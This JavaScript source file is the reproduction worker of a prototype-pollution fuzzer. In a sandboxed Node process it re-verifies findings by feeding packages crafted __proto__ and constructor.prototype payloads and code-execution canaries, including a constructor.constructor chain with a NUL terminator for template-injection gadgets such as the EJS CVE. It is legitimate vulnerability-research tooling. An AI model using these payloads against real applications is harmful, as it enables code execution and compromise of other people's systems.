/**
 * Reproduction Worker — the independent second oracle.
 *
 * This worker exists to *reproduce* a proposed finding in a fresh Node process,
 * completely separate from the discovery oracle (sandbox-worker.js / the
 * in-process differential). It deliberately shares NONE of the fuzzy verdict
 * logic (no output/error diffing, no getter-trap "read" heuristic). It computes
 * only two booleans, each from ground-truth facts:
 *
 *   repro_pp  — did feeding a crafted __proto__ / constructor.prototype / path
 *               payload to the target actually add an own-property (named exactly
 *               like the attacker-supplied property) to a monitored prototype?
 *   repro_rce — did setting a canary payload on Object.prototype and invoking the
 *               entry point actually execute code (a unique token appears on
 *               globalThis)?
 *
 * Because discovery and reproduction are two independent oracles, an
 * observer-effect or bug in discovery cannot self-confirm a finding. A finding is
 * only reported as a vulnerability when this worker agrees — twice, in two fresh
 * processes (enforced by the driver in ../verification/reproduce.js).
 *
 * Security hardening mirrors sandbox-worker.js (network + child_process + exit
 * blocked, env scrubbed by the parent). Crucially, this worker does NOT stub
 * eval/Function — for the canary to prove code execution, the sink must actually
 * run. child_process stays blocked, so proof-of-execution means "attacker code
 * ran" (a global write), never "a shell spawned".
 */

import { createRequire } from 'module';
import { snapshotPrototype, detectAndRestorePrototype } from './prototype-monitor.js';
import { hardenWorkerProcess } from './worker-hardening.js';
import { setupJsdomGlobals, loadBrowserModule, JSDOM_STARTUP_ALLOWANCE_MS } from './browser-env.js';
const require = createRequire(import.meta.url);

// ─── SECURITY: capability blocks (shared with sandbox-worker.js) ─────────────
// child_process and worker_threads are always blocked; network egress is blocked
// unless the operator opted in via --allow-network. See worker-hardening.js for
// the threat model. eval/Function are intentionally NOT hooked here — the canary
// payload must actually execute for repro_rce to prove code execution; it is
// contained by blocking the effects (network/child_process) plus the container.
hardenWorkerProcess(require, { blockNetwork: process.env.UOPFUZZ_BLOCK_NETWORK === '1' });

// ─── SECURITY: Restrict dangerous process methods ────────────
const originalExit = process.exit;
process.exit = function (code) {
  process.send?.({ error: `Target called process.exit(${code})`, verified: false, exitAttempt: true });
  originalExit.call(process, 0);
};

const CANARY_GLOBAL = '__uopfuzz_repro_canary';

// ─── MESSAGE HANDLER ─────────────────────────────────────────
process.on('message', async (msg) => {
  const { mode, packageName, entryPoint, args, timeoutMs, browserEnv } = msg;
  // Browser-only targets must boot jsdom before loading; give the same cold-start
  // allowance the discovery worker and the sandbox driver use, so the module
  // graph + DOM setup does not race the self-timeout on the first (only) load.
  const startupAllowance = browserEnv ? JSDOM_STARTUP_ALLOWANCE_MS : 0;
  const killTimer = setTimeout(() => {
    process.send?.({ error: 'Self-timeout reached', verified: false, timedOut: true });
    originalExit.call(process, 0);
  }, (timeoutMs || 3000) + startupAllowance + 500);

  try {
    const result = await handle(mode, packageName, entryPoint, args, msg, timeoutMs);
    clearTimeout(killTimer);
    process.send?.(result);
  } catch (error) {
    clearTimeout(killTimer);
    process.send?.({ error: error.message, verified: false });
  }
  originalExit.call(process, 0);
});

async function handle(mode, packageName, entryPoint, args, msg, timeoutMs) {
  const targetModule = await loadPackage(packageName, msg.browserEnv);
  if (targetModule?.__loadError) {
    return { error: `Cannot load ${packageName}: ${targetModule.__loadError}`, verified: false };
  }

  const fn = resolveEntryPoint(targetModule, entryPoint, packageName);
  if (!fn) return { error: `Entry point ${entryPoint} not found in ${packageName}`, verified: false };

  const realArgs = deserializeArgs(args);

  switch (mode) {
    case 'repro_pp':  return reproPP(fn, realArgs, msg, timeoutMs);
    case 'repro_rce': return reproRCE(fn, realArgs, msg, timeoutMs, targetModule, packageName);
    default:          return { error: `Unknown repro mode: ${mode}`, verified: false };
  }
}

/**
 * Run a config.sequences-style multi-step call chain with pre-resolved args
 * (mirrors buildCallableThunk in ../instrumentation/index.js). Needed because
 * some gadgets (e.g. CVE-2022-29078: EJS's compile()) only execute when the
 * function an entry point RETURNS is subsequently invoked — a single call to
 * the entry point itself never reaches the sink.
 */
async function runSequence(targetModule, steps, timeoutMs, packageName) {
  let lastResult = null;
  for (const step of steps) {
    let fn;
    if (step.call === '__result__') {
      if (step.method && lastResult && typeof lastResult[step.method] === 'function') {
        fn = lastResult[step.method].bind(lastResult);
      } else if (typeof lastResult === 'function') {
        fn = lastResult;
      } else {
        return lastResult;
      }
    } else {
      fn = resolveEntryPoint(targetModule, step.call, packageName);
      if (!fn) return null;
    }
    const args = deserializeArgs(step.args || []);
    lastResult = await callAwaitingRealPromise(fn, args, timeoutMs);
  }
  return lastResult;
}

async function loadPackage(packageName, browserEnv) {
  // Browser-only libraries (jQuery, Backbone, …) touch `window`/`document` at
  // load time and export a factory; stand up jsdom first and load through it,
  // mirroring the discovery worker (sandbox-worker.js loadTargetCached). Without
  // this, the fresh reproduction process could never load such a target, so any
  // real browser-library gadget was permanently unprovable.
  if (browserEnv) {
    try {
      const dom = await setupJsdomGlobals();
      return loadBrowserModule(require, packageName, dom);
    } catch (err) {
      return { __loadError: `browser-only load failed: ${err.message}` };
    }
  }
  try { return await import(packageName); }
  catch {
    try { return require(packageName); }
    catch (err) { return { __loadError: err.message }; }
  }
}

/**
 * repro_pp: prove the target pollutes a monitored prototype when fed a crafted
 * payload, with the polluted property NAME matching the attacker-supplied one.
 * Tries the same real-world calling conventions as the discovery merge-PP test.
 */
async function reproPP(fn, baseArgs, msg, timeoutMs) {
  const prop = msg.property;
  const val = msg.value;

  let protoPayload = null;
  try { protoPayload = JSON.parse(`{"__proto__":{"${prop}":${JSON.stringify(val)}}}`); } catch { /* non-serializable */ }
  const ctorPayload = { constructor: { prototype: { [prop]: val } } };

  const targetObj = baseArgs[0] && typeof baseArgs[0] === 'object' ? baseArgs[0] : {};
  const argVariants = [
    ...(protoPayload ? [
      [protoPayload],
      [{}, protoPayload],
      [true, {}, protoPayload],
      [targetObj, protoPayload],
    ] : []),
    [ctorPayload],
    [{}, ctorPayload],
    [true, {}, ctorPayload],
    [{}, `__proto__.${prop}`, val],
    [{}, `constructor.prototype.${prop}`, val],
  ];

  for (const callArgs of argVariants) {
    const snapshot = snapshotPrototype();
    try { await withTimeout(Promise.resolve(fn(...clone(callArgs))), timeoutMs); }
    catch { /* execution errors are expected */ }
    const detection = detectAndRestorePrototype(snapshot);

    if (detection.polluted) {
      // Attacker control: require the polluted key to match the supplied property.
      // Guards against a package that benignly extends a prototype under a
      // different name.
      const matched = detection.newProps.find(p => lastKey(p) === prop);
      if (matched) {
        return {
          verified: true,
          newProps: detection.newProps,
          matchedProperty: prop,
          callConvention: describeConvention(callArgs, prop),
        };
      }
    }
  }
  return { verified: false };
}

/**
 * repro_rce: prove code execution. Set a canary payload on Object.prototype for
 * the primary property; force any gate properties to true; invoke the entry
 * point (or replay a resolved multi-step sequence, for gadgets like
 * CVE-2022-29078 that only fire on a function the entry point RETURNS); check
 * whether the canary token reached globalThis.
 *
 * The constructor_chain payload ends with a NUL character (built at runtime via
 * String.fromCharCode, never written as literal escape text in this source file,
 * so the file itself stays plain UTF-8 with no embedded control bytes). Some
 * template/code-generation gadgets splice this payload into generated source,
 * and a trailing NUL can terminate a subsequent literal there, letting the
 * injected call survive compilation.
 */
async function reproRCE(fn, baseArgs, msg, timeoutMs, targetModule, packageName) {
  const prop = msg.property;
  const gates = Array.isArray(msg.gates) ? msg.gates.filter(g => g && g !== prop) : [];
  const sequenceSteps = msg.sequence?.steps;
  // Unique per-attempt token; built inside the worker so no function crosses IPC.
  const token = `UOPFUZZ_${msg.nonce || 'x'}_${gates.length}`;
  const nulChar = String.fromCharCode(0);

  const payloads = [
    { type: 'function_call', make: () => new Function(`globalThis['${CANARY_GLOBAL}']='${token}'`) },
    { type: 'eval_string', make: () => `globalThis['${CANARY_GLOBAL}']='${token}'` },
    { type: 'constructor_chain', make: () => `constructor.constructor("globalThis['${CANARY_GLOBAL}']='${token}'")()${nulChar}` },
  ];

  for (const payload of payloads) {
    delete globalThis[CANARY_GLOBAL];
    const installed = [];
    try {
      installProp(prop, payload.make(), installed);
      for (const g of gates) installProp(g, true, installed);
      try {
        if (Array.isArray(sequenceSteps) && sequenceSteps.length) {
          await runSequence(targetModule, sequenceSteps, timeoutMs, packageName);
        } else {
          await callAwaitingRealPromise(fn, clone(baseArgs), timeoutMs);
        }
      } catch { /* exploit payloads routinely throw after firing */ }
    } finally {
      for (const p of installed.reverse()) restoreProp(p);
    }

    if (globalThis[CANARY_GLOBAL] === token) {
      delete globalThis[CANARY_GLOBAL];
      return { verified: true, payloadType: payload.type, canary: token, gates };
    }
  }
  delete globalThis[CANARY_GLOBAL];
  return { verified: false };
}

// ─── prototype install/restore ───────────────────────────────
function installProp(prop, value, installed) {
  const hadProp = Object.prototype.hasOwnProperty.call(Object.prototype, prop);
  const origVal = hadProp ? Object.prototype[prop] : undefined;
  try { Object.defineProperty(Object.prototype, prop, { value, writable: true, configurable: true, enumerable: false }); }
  catch { try { Object.prototype[prop] = value; } catch { /* sealed */ } }
  installed.push({ prop, hadProp, origVal });
}

function restoreProp({ prop, hadProp, origVal }) {
  try { delete Object.prototype[prop]; } catch { /* sealed */ }
  if (hadProp) { try { Object.prototype[prop] = origVal; } catch { /* sealed */ } }
}

// ─── helpers ─────────────────────────────────────────────────
function withTimeout(promise, ms) {
  let timer;
  return Promise.race([
    Promise.resolve(promise),
    new Promise((_, reject) => { timer = setTimeout(() => reject(new Error('timeout')), ms); }),
  ]).finally(() => clearTimeout(timer));
}

/**
 * Invoke the target and await only a GENUINE promise result.
 *
 * `Promise.resolve(value)` and `await value` adopt any thenable by reading
 * `value.then` and, if callable, invoking it. When the reproduction payload
 * pollutes `Object.prototype.then` with a callable canary, EVERY returned object
 * becomes thenable, so wrapping the target's return value would fire the canary
 * from the harness's own plumbing — "code execution" the target never performed
 * (observed as a false positive on jQuery's Event()). Gating on `instanceof
 * Promise` awaits real async results (a native promise is awaited without a
 * `.then` property read) while never adopting a plain return object, so the only
 * way the canary can fire is the target actually reaching a sink.
 */
async function callAwaitingRealPromise(fn, args, ms) {
  const ret = fn(...args);
  return ret instanceof Promise ? await withTimeout(ret, ms) : ret;
}

function clone(arr) {
  return arr.map(a => {
    if (a && typeof a === 'object') {
      try { return structuredClone(a); } catch { return a; }
    }
    return a;
  });
}

function lastKey(qualifiedName) {
  return String(qualifiedName).split('.').pop();
}

function describeConvention(callArgs, prop) {
  if (typeof callArgs[1] === 'string' && callArgs[1].includes(prop)) return `fn({}, '${callArgs[1]}', value)`;
  if (callArgs[0] === true) return 'fn(true, {}, payload)';
  if (callArgs.length === 1) return 'fn(payload)';
  return 'fn(target, payload)';
}

/**
 * Resolve the callable for `name` on `module`. The bare-function fallback
 * (module.exports = fn, e.g. merge-deep, deep-extend) only applies when `name`
 * actually identifies the module itself (equals the package name) — it must
 * never silently substitute the whole module for an unrelated/unresolved name.
 */
function resolveEntryPoint(module, name, packageName) {
  if (!name) return null;
  // Bare-function module: `module.exports = fn` (merge-deep, deep-extend, …).
  // Only fall back to the module itself when `name` IS the package's own name —
  // never as a catch-all for an unrelated or nonexistent entry point name.
  // Checked BEFORE the dotted-path branch below: a package identifier can be a
  // filesystem path (a local target, or a test fixture) whose directory contains
  // a dot — e.g. `.../.claude/worktrees/.../bare-merge`. Treating that as a
  // dotted property path would walk nonexistent keys and never reach this
  // fallback, so a bare-function module addressed by a dotted path would fail to
  // resolve. This short-circuits only when the module itself is callable.
  if (name === packageName) {
    if (typeof module === 'function') return module;
    if (typeof module.default === 'function') return module.default;
  }
  if (name.includes('.')) {
    const parts = name.split('.');
    let current = module;
    for (const part of parts) {
      if (current && current[part]) current = current[part];
      else return null;
    }
    return typeof current === 'function' ? current : null;
  }
  if (typeof module[name] === 'function') return module[name];
  if (module.default && typeof module.default[name] === 'function') return module.default[name];
  return null;
}

function deserializeArgs(args) {
  return (args || []).map(arg => {
    if (arg && typeof arg === 'object' && arg.__type) {
      switch (arg.__type) {
        case 'date': return new Date(arg.iso);
        case 'buffer': return Buffer.from(arg.data, 'base64');
        case 'function': return new Function('return ' + arg.source)();
        default: return arg;
      }
    }
    return arg;
  });
}
